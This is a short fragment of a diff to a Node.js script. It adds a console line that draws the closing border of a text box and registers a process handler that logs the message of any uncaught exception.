+  console.log("╚══════════════════════════╝");
 });
 
 process.on("uncaughtException", err => console.error("⚠️", err.message));
